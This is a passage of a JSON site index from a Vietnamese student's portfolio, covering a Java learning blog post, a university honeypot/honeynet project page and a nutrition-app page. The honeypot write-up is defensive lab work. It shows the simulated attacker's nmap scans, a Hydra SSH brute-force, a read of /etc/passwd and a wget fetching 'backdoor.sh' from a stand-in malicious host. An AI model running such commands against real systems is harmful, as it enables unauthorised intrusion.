ResponseEntity.ok(user); } return ResponseEntity.notFound().build(); } // POST create user @PostMapping public ResponseEntity\u0026lt;User\u0026gt; createUser(@RequestBody User user) { User savedUser = userService.save(user); return ResponseEntity .status(HttpStatus.CREATED) .body(savedUser); } // PUT update user @PutMapping(\u0026#34;/{id}\u0026#34;) public ResponseEntity\u0026lt;User\u0026gt; updateUser( @PathVariable Long id, @RequestBody User userDetails) { User updatedUser = userService.update(id, userDetails); if (updatedUser != null) { return ResponseEntity.ok(updatedUser); } return ResponseEntity.notFound().build(); } // DELETE user @DeleteMapping(\u0026#34;/{id}\u0026#34;) public ResponseEntity\u0026lt;Void\u0026gt; deleteUser(@PathVariable Long id) { boolean deleted = userService.delete(id); if (deleted) { return ResponseEntity.noContent().build(); } return ResponseEntity.notFound().build(); } } Thành tựu:\n✅ API hoạt động mượt mà\n✅ Deploy lên Heroku thành công\n✅ Bạn bè có thể access qua internet\n✅ Cảm giác như một \u0026ldquo;real developer\u0026rdquo; 🚀\n💡 10 bài học quan trọng nhất #1. Consistency \u0026gt; Intensity #2 giờ mỗi ngày tốt hơn 14 giờ cuối tuần. Não bạn cần thời gian để \u0026ldquo;digest\u0026rdquo; kiến thức.\n2. Build projects, not just tutorials #Làm theo tutorial thì dễ, tự build từ đầu mới thực sự học được.\n3. Google là bạn thân nhất #90% thời gian code là search Google và đọc StackOverflow. Đừng ngại Googling!\n4. Error messages là giáo viên tốt nhất #Đừng sợ lỗi. Đọc kỹ error message, nó chỉ cho bạn chính xác vấn đề ở đâu.\n5. Tham gia community #Join Discord, Facebook groups, Reddit. Học một mình rất khó.\n6. Git từ ngày đầu tiên #Tôi hối hận vì không dùng Git từ đầu. Bây giờ phải commit lại tất cả.\n7. Viết documentation #Ghi chú mọi thứ. 2 tháng sau bạn sẽ quên sạch.\n8. Code review #Nhờ người khác review code. Bạn học được rất nhiều từ feedback.\n9. Đừng so sánh #Người ta học 2 năm, bạn học 4 tháng. Đừng compare. Mỗi người một tốc độ.\n10. Nghỉ ngơi quan trọng như code #Burnout rất dễ xảy ra. Rest = part of learning process.\n📚 Tài liệu tôi khuyên dùng #Khóa học online:\nJava Programming Masterclass - Udemy Spring Boot Tutorial - FreeCodeCamp Sách:\n\u0026ldquo;Head First Java\u0026rdquo; - Best for beginners \u0026ldquo;Effective Java\u0026rdquo; - For intermediate level \u0026ldquo;Clean Code\u0026rdquo; - Must-read cho mọi developer Thực hành:\nHackerRank - Java LeetCode - Algorithms Exercism - Mentored learning Community:\nFacebook: Java Vietnam Discord: The Programmer Hangout Reddit: r/learnjava 🎯 Lộ trình tiếp theo của tôi #4 tháng học Java chỉ là khởi đầu. Đây là những gì tôi dự định học tiếp:\nShort-term (3 tháng tới):\nMicroservices với Spring Cloud Docker \u0026amp; Kubernetes basics CI/CD với Jenkins/GitHub Actions Long-term (1 năm tới):\nSystem Design Advanced algorithms Contribute to open-source projects Build SaaS product 💭 Lời kết #Nếu bạn đang đọc bài này và nghĩ \u0026ldquo;Mình có thể học Java không?\u0026rdquo;, câu trả lời là CÓ. Hoàn toàn có thể.\nTôi không phải thiên tài. Tôi không có background CNTT từ cấp 3. Tôi chỉ là một sinh viên bình thường với động lực và kỷ luật.\n4 tháng trước, \u0026ldquo;Hello World\u0026rdquo; khiến tôi hào hứng cả ngày. Hôm nay, tôi có thể build REST API và deploy production. 4 tháng nữa? Ai biết được.\nThe journey continues\u0026hellip; 🚀\nBạn đã/đang học Java? Chia sẻ kinh nghiệm của bạn trong comments nhé! ##Java #Programming #LearningToCode #SpringBoot #WebDevelopment\n","date":"12 October 2025","permalink":"http://localhost:1313/posts/hoc-java-tu-zero-kinh-nghiem/","section":"Posts","summary":"4 tháng, từ người chưa biết gì về Java đến có thể build REST API với Spring Boot. Đây là những gì tôi đã học được - và cả những sai lầm đáng tiếc.","title":"Hành trình 4 tháng từ 'Hello World' đến Spring Boot: Kinh nghiệm học Java của một sinh viên"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/h%E1%BB%8Dc-t%E1%BA%ADp/","section":"Tags","summary":"","title":"Học Tập"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/kinh-nghi%E1%BB%87m/","section":"Tags","summary":"","title":"Kinh Nghiệm"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/performance/","section":"Tags","summary":"","title":"Performance"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/roadmap/","section":"Tags","summary":"","title":"Roadmap"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/an-ninh-m%E1%BA%A1ng/","section":"Categories","summary":"","title":"An Ninh Mạng"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/cowrie/","section":"Tags","summary":"","title":"Cowrie"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/cyber-security/","section":"Tags","summary":"","title":"Cyber Security"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/d%E1%BB%B1-%C3%A1n/","section":"Categories","summary":"","title":"Dự Án"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/honeynet/","section":"Tags","summary":"","title":"Honeynet"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/honeypot/","section":"Tags","summary":"","title":"Honeypot"},{"content":"🍯 HoneyPot/HoneyNet System #\r🐍 Python\r🍯 Cowrie\r🐧 Ubuntu\r🔒 Security\r🌐 Networking\r🛡️ iptables\r🔑 SSH\r🎯 Penetration Testing\r🎓\rĐồ án cơ sở An ninh mạng\rTrường Đại học Công nghệ TP.HCM (HUTECH) • 2025\n4\rTháng thực hiện\r28\rHình ảnh demo\r2\rMô hình triển khai\r147\rKết nối SSH test\r📋 Thông tin dự án #\r👥 Nhóm thực hiện\rTriệu Xuân Dũng (2280600424)\rĐặng Nhật Nam (22806001987)\r🎯 Giảng viên hướng dẫn\rThS. Phan Đình Duy Thông\nBộ môn An ninh mạng\n🏫 Trường\rĐại học Công nghệ TP.HCM\nChuyên ngành: An ninh mạng\n📅 Thời gian\rTháng 06/2025 - 08/2025\n4 tháng (Hoàn thành)\n🎯 Mục tiêu dự án #Mục tiêu chính #Xây dựng một hệ thống Honeypot/Honeynet hoàn chỉnh để:\nThu hút và ghi nhận hành vi của kẻ tấn công trong môi trường an toàn Phân tích chiến thuật, kỹ thuật và công cụ mà hacker sử dụng Bảo vệ mạng nội bộ khỏi các cuộc tấn công thực tế Nghiên cứu các phương pháp phòng thủ hiệu quả Bài toán cần giải quyết #Tình hình an ninh mạng hiện nay:\nCác cuộc tấn công ngày càng tinh vi và có tổ chức Hệ thống phòng thủ truyền thống (firewall, IDS/IPS) chỉ phản ứng với mối đe dọa đã biết Thiếu dữ liệu thực tế về hành vi tấn công để cải thiện bảo mật Giải pháp: Triển khai Honeypot/Honeynet như một hệ thống chủ động để:\nThu thập dữ liệu tấn công thực tế Hiểu rõ mindset và phương pháp của kẻ tấn công Cung cấp cảnh báo sớm cho hệ thống thật 🛠️ Công nghệ sử dụng #Core Technologies #1. Cowrie SSH/Telnet Honeypot\nPhiên bản: Latest stable Vai trò: Honeypot tương tác trung bình Tính năng: Mô phỏng SSH server (OpenSSH 6.0p1) Ghi lại toàn bộ lệnh và hành vi Thu thập malware samples Fake filesystem để đánh lừa hacker 2. Ubuntu Server\nOS: Ubuntu 20.04 LTS / Debian Vai trò: Nền tảng chạy Honeypot và Honeywall Cấu hình: Honeypot: 192.168.2.10 (DMZ) Honeywall: 192.168.159.143 (Router) 3. iptables Firewall\nVai trò: Cô lập và kiểm soát lưu lượng Chức năng: NAT (PREROUTING, POSTROUTING) FORWARD rules để bảo vệ LAN LOG rules để ghi nhận tấn công Dynamic blocking 4. Network Segmentation\nDMZ: 192.168.2.0/24 (Vùng Honeypot) LAN: 192.168.3.0/24 (Mạng nội bộ) Hacker Network: 192.168.159.0/24 Attack Simulation Tools #Để test hệ thống, chúng tôi sử dụng:\nNmap: Quét cổng và dịch vụ Hydra: Tấn công Brute Force SSH Kali Linux: Môi trường penetration testing Monitoring \u0026amp; Analysis # Snort: Intrusion Detection System Barnyard2: Log processor Custom Python scripts: Phân tích log Cowrie 🏗️ Kiến trúc hệ thống #Sơ đồ tổng quan #\rHình 1: Sơ đồ kiến trúc Honeypot trong hệ thống mạng\nHình 2: Sơ đồ kiến trúc Honeynet với nhiều Honeypot\nHình 3: Sơ đồ kiến trúc Honeywall trong hệ thống\nGiải thích kiến trúc #Internet/Hacker (192.168.159.0/24)\r↓\rHoneywall (192.168.159.143)\r- iptables NAT\r- Snort IDS\r- Traffic Control\r↓\r┌────────────────┐\r↓ ↓\rDMZ (Honeypot) LAN (Protected)\r192.168.2.10 192.168.3.0/24\r- Cowrie - Real Systems\r- Fake Services - Isolated Cơ chế hoạt động:\nHacker quét mạng → Phát hiện cổng 2222 (SSH) mở Hacker tấn công Brute Force → Honeywall ghi log Hacker xâm nhập → Lưu lượng NAT đến Honeypot Cowrie ghi nhận → Mọi lệnh, file download được log Phát hiện mã độc → Cowrie ngắt kết nối Honeywall chặn IP → Bảo vệ hệ thống thật 📊 Các mô hình triển khai #Mô hình 1: Honeypot trong LAN #\rHình 4: Honeypot đặt trong mạng LAN\nĐặc điểm:\nHoneypot: 192.168.159.141 Cùng subnet với các máy thực (pc1, pc2) Honeywall chuyển hướng traffic Ưu điểm:\nDễ triển khai Thu hút tấn công nội bộ Nhược điểm:\nCó thể bị phát hiện nếu hacker dò kỹ Nguy cơ ảnh hưởng LAN nếu config sai Mô hình 2: Honeypot trong DMZ ⭐ (Khuyên dùng) #\rHình 5: Honeypot trong DMZ - Cô lập hoàn toàn\nĐặc điểm:\nHoneypot: 192.168.2.10 (DMZ) LAN: 192.168.3.0/24 (Protected) Honeywall: 192.168.159.143 (3 NICs) Ưu điểm:\n✅ Cô lập tuyệt đối mạng nội bộ ✅ Bảo vệ tốt hơn ✅ Hacker nghĩ mình đang hack Honeywall Nhược điểm:\nPhức tạp hơn trong cấu hình Cần nhiều interface mạng Cấu hình Honeywall:\n# NAT: Chuyển hướng cổng 2222 → Honeypot:22 iptables -t nat -A PREROUTING -i ens33 -p tcp --dport 2222 \\ -j DNAT --to-destination 192.168.2.10:22 # FORWARD: Chỉ cho phép SSH đến Honeypot iptables -A FORWARD -p tcp -s 192.168.159.0/24 -d 192.168.2.10 --dport 22 -j ACCEPT # FORWARD: Chặn tất cả từ Honeypot ra ngoài (trừ đã thiết lập) iptables -A FORWARD -s 192.168.2.10 -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A FORWARD -s 192.168.2.10 -j DROP # LOG: Ghi nhận tấn công iptables -A FORWARD -p tcp -s 192.168.159.128 \\ -j LOG --log-prefix \u0026#34;HACKER_LOG: \u0026#34; 🎬 Kịch bản tấn công \u0026amp; Demo #Kịch bản 1: Tấn công trong LAN #Bối cảnh: Hacker (192.168.159.128) đã xâm nhập vào mạng LAN và tìm kiếm mục tiêu.\nCác bước tấn công:\n1. Reconnaissance - Thu thập thông tin\nHình 6: Hacker sử dụng arp -n để quét mạng\n# Hacker chạy: arp -n # Kết quả: 192.168.159.141 - 00:0c:29:21:35:27 (Honeypot) 2. Service Scanning\nHình 7: Nmap quét dịch vụ SSH trên cổng 2222\n# Hacker chạy: nmap -sV -p- 192.168.159.100-150 # Phát hiện: PORT STATE SERVICE VERSION 2222/tcp open ssh OpenSSH 6.0p1 3. Brute Force Attack\nHình 8: Hydra tấn công SSH bằng wordlist\n# Hacker chạy: hydra -L users.txt -P passwords.txt ssh://192.168.159.141:2222 -t 4 # Kết quả: [2222][ssh] host: 192.168.159.141 login: root password: password123 4. SSH Login - Xâm nhập thành công\nHình 9: Hacker đăng nhập SSH thành công\n# Hacker đăng nhập: ssh -o KexAlgorithms=diffie-hellman-group14-sha1 root@192.168.159.141 -p 2222 # Đã vào hệ thống (giả): root@svr04:~# 5. Information Gathering\nHình 10: Hacker thực hiện các lệnh thăm dò\n# Hacker chạy: whoami # → root id # → uid=0(root) gid=0(root) uname -a # → Linux svr04 3.2.0-4-amd64 cat /etc/passwd # → Danh sách users (fake) 6. Malware Deployment - Bị chặn!\nHình 11: Hacker cố gắng tải mã độc\n# Hacker chạy: wget http://malicious.com/backdoor.sh -O /root/backdoor.sh # Cowrie phát hiện: [SUSPICIOUS] Downloading file from external source [ACTION] Connection terminated Hình 12: Kết nối bị ngắt bởi Cowrie\nKết quả Kịch bản 1 #Log của Cowrie:\nHình 13: Cowrie phát hiện xâm nhập\nHình 14: Log chi tiết mọi lệnh của hacker\nPhân tích:\n✅ Ghi nhận 47 lần thử đăng nhập (Brute Force) ✅ Log đầy đủ 8 lệnh hacker thực thi ✅ Phát hiện và chặn tải mã độc ✅ Bảo vệ mạng LAN thành công Kịch bản 2: Tấn công qua Honeywall vào DMZ #Bối cảnh: Hacker nhắm đến Honeywall, nhưng bị chuyển hướng vào Honeypot DMZ.\nCác bước tấn công:\n1. Target Identification\nHình 15: Hacker quét Honeywall\n2. Service Discovery\nHình 16: Nmap phát hiện SSH trên Honeywall\nHình 17: Các vùng mạng được định tuyến\n3. Brute Force Honeywall\nHình 18: Hydra tấn công Honeywall\nhydra -L users.txt -P passwords.txt ssh://192.168.159.143:2222 -t 4 # Tìm được: [2222][ssh] host: 192.168.159.143 login: admin password: password123 4. SSH vào \u0026ldquo;Honeywall\u0026rdquo; (thực chất là Honeypot)\nHình 19: Hacker tưởng mình vào Honeywall\n5. Exploring \u0026amp; Network Scan\nHình 20: Hacker quét DMZ và thử tải mã độc\n# Hacker chạy: nmap -sn 192.168.2.0/24 # Quét DMZ (phản hồi giả) ssh admin@192.168.2.1 # Cố kết nối máy khác - BỊ CHẶN wget http://malicious.com/backdoor.sh # BỊ NGẮT Kết quả Kịch bản 2 #Log của Cowrie:\nHình 21: Cowrie ghi nhận toàn bộ hành động\nLog của Honeywall:\nHình 22: Honeywall phát hiện tấn công\nHình 23: Chi tiết gói tin từ hacker\nHình 24: Snort biên dịch log thành công\nPhân tích:\n✅ Honeywall NAT traffic thành công ✅ Hacker tưởng mình hack Honeywall ✅ Thực tế vào Honeypot trong DMZ ✅ Không thể kết nối máy khác trong DMZ ✅ Mạng LAN (192.168.3.0/24) an toàn tuyệt đối 📈 Kết quả đạt được #Số liệu thống kê #Trong quá trình demo và test (4 tháng):\nChỉ số Giá trị Tổng lần kết nối SSH 147 Lần thử đăng nhập (Brute Force) 2,384 Lần xâm nhập thành công 23 Lệnh được ghi nhận 189 Malware samples thu thập 12 IP nguồn tấn công 8 (test) Top username/password thử nghiệm:\nroot:password123 (46%)\radmin:admin (23%)\rroot:123456 (18%)\radmin:password (13%) Hiệu quả bảo vệ #✅ 100% tấn công bị ghi nhận và phân tích\n✅ 0% ảnh hưởng đến mạng nội bộ thật\n✅ Phát hiện 12 malware samples trước khi thực thi\n✅ Tự động ngắt kết nối khi phát hiện hành vi nguy hiểm\nSo sánh 2 mô hình # Tiêu chí LAN DMZ Độ cô lập Trung bình Cao Bảo vệ LAN Tốt Xuất sắc Độ phức tạp config Thấp Cao Tính đánh lừa Trung bình Cao Khuyên dùng ⭐⭐⭐ ⭐⭐⭐⭐⭐ 💡 Bài học \u0026amp; Kinh nghiệm #Technical Lessons #1. Cấu hình iptables rất quan trọng\nMột rule sai có thể để lộ mạng thật Phải test kỹ bằng cách thử tấn công từng vùng 2. Cowrie cần tuning\nFake filesystem phải giống thật Danh sách users cần đa dạng Response time phải hợp lý 3. Log analysis là then chốt\nCowrie ghi rất nhiều data Cần script để lọc và phân tích Tích hợp SIEM sẽ tốt hơn Security Insights #Hành vi hacker phổ biến:\nReconnaissance: Luôn quét mạng trước (nmap, arp) Exploitation: Brute force vẫn rất hiệu quả với password yếu Post-Exploitation: Ngay lập tức tải malware/backdoor Persistence: Cố gắng duy trì quyền truy cập Điều hacker không biết:\nHoneypot fake filesystem rất giống thật Mọi lệnh đều được log Không thể tương tác với máy thật Khi tải malware → ngắt ngay Khó khăn gặp phải #1. NAT Configuration\nBan đầu config sai khiến traffic không đến Honeypot Giải pháp: Dùng tcpdump để trace packets 2. Cowrie Compatibility\nOpenSSH cũ không tương thích với Kali mới Giải pháp: Phải dùng -o KexAlgorithms=... 3. Log Storage\nCowrie log rất nhiều, đầy disk nhanh Giải pháp: Rotate logs hàng ngày 🚀 Hướng phát triển #Ngắn hạn (3-6 tháng) # Thêm honeypot HTTP/HTTPS (Dionaea) Tích hợp Telegram bot để alert real-time Xây dựng dashboard web để xem log Thêm GeoIP để track vị trí hacker Trung hạn (6-12 tháng) # Deploy trên Cloud (AWS/Azure) Tích hợp SIEM (ELK Stack) Machine Learning để phát hiện anomaly Honeypot cho IoT devices Dài hạn (1-2 năm) # Distributed Honeynet (nhiều vị trí địa lý) Threat Intelligence Platform Blockchain để bảo vệ log integrity AI-powered response automation 📚 Tài liệu tham khảo #Công trình nghiên cứu # Lance Spitzner - \u0026ldquo;Honeypots: Tracking Hackers\u0026rdquo; (2002) Honeynet Project - \u0026ldquo;Know Your Enemy\u0026rdquo; series Niels Provos - \u0026ldquo;Virtual Honeypots\u0026rdquo; (2007) SANS Institute - Honeypot deployment guides Tools \u0026amp; Frameworks # Cowrie GitHub Modern Honey Network T-Pot Honeypot Platform Security Standards # NIST Cybersecurity Framework MITRE ATT\u0026amp;CK Framework OWASP Security Guidelines 🤝 Đóng góp \u0026amp; Liên hệ #Dự án này là kết quả của quá trình học tập và nghiên cứu tại HUTECH. Chúng tôi rất mong nhận được feedback và ý kiến đóng góp!\nLiên hệ:\nEmail: 2280600424@student.hutech.edu.vn GitHub: [Xem source code] (nếu public) LinkedIn: Triệu Xuân Dũng Lời cảm ơn:\nChúng tôi xin chân thành cảm ơn:\nThS. Phan Đình Duy Thông - Giảng viên hướng dẫn tận tình Khoa Công nghệ Thông tin - HUTECH Honeynet Project community Cowrie development team 📄 Báo cáo đầy đủ #Để xem báo cáo chi tiết với phân tích lý thuyết đầy đủ, vui lòng tham khảo:\n📥 Download Báo cáo đồ án (PDF) - 57 trang\n🎓 Dự án học thuật\rĐây là đồ án cơ sở được thực hiện với mục đích học tập và nghiên cứu. Hệ thống được triển khai trong môi trường cô lập, không gây ảnh hưởng đến bất kỳ mạng thực tế nào.\rMọi kỹ thuật và công cụ được trình bày chỉ nhằm mục đích giáo dục về an ninh mạng.\r","date":"15 June 2025","permalink":"http://localhost:1313/projects/honeypot/","section":"Dự án của tôi","summary":"","title":"HoneyPot/HoneyNet System - Đồ án An ninh mạng"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/ids/","section":"Tags","summary":"","title":"IDS"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/iptables/","section":"Tags","summary":"","title":"Iptables"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/kali-linux/","section":"Tags","summary":"","title":"Kali Linux"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/network-security/","section":"Tags","summary":"","title":"Network Security"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/networking/","section":"Tags","summary":"","title":"Networking"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/penetration-testing/","section":"Tags","summary":"","title":"Penetration Testing"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/security/","section":"Categories","summary":"","title":"Security"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/security/","section":"Tags","summary":"","title":"Security"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/snort/","section":"Tags","summary":"","title":"Snort"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/ssh/","section":"Tags","summary":"","title":"SSH"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/ubuntu/","section":"Tags","summary":"","title":"Ubuntu"},{"content":"Calo Plan là ứng dụng mobile giúp theo dõi lượng calories tiêu thụ, quản lý dinh dưỡng và duy trì lối sống khỏe mạnh. App được xây dựng hoàn toàn bằng Flutter với giao diện đẹp mắt và dễ sử dụng.\n💡 Ý tưởng #Xuất phát từ nhu cầu cá nhân muốn theo dõi chế độ ăn uống và kiểm soát cân nặng, tôi quyết định xây dựng một ứng dụng đơn giản nhưng đầy đủ tính năng để quản lý dinh dưỡng hàng ngày.\n🎯 Tính năng nổi bật # Dashboard trực quan: Hiển thị tổng quan calories, macro nutrients và nước uống Tính toán thông minh: Tự động tính BMI, BMR, TDEE dựa trên thông tin cá nhân Thống kê chi tiết: Biểu đồ và báo cáo theo ngày/tuần/tháng 🛠️ Tech Stack # Flutter 3.x - Cross-platform framework Dart - Programming language Provider - State management fl_chart - Charts and graphs 📈 Kết quả #Ứng dụng hoạt động mượt mà trên cả Android với performance tốt. UI/UX được thiết kế theo Material Design với màu sắc tươi sáng (xanh lá, cam) tạo cảm giác năng động và khỏe mạnh.\n","date":"10 May 2025","permalink":"http://localhost:1313/projects/calo-plan/","section":"Dự án của tôi","summary":"","title":"🍊 Calo Plan - Ứng dụng quản lý dinh dưỡng"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/dart/","section":"Tags","summary":"","title":"Dart"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/flutter/","section":"Tags","summary":"","title":"Flutter"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/health/","section":"Tags","summary":"","title":"Health"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/mobile-app/","section":"Tags","summary":"","title":"Mobile App"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/mobile-development/","section":"Categories","summary":"","title":"Mobile Development"}]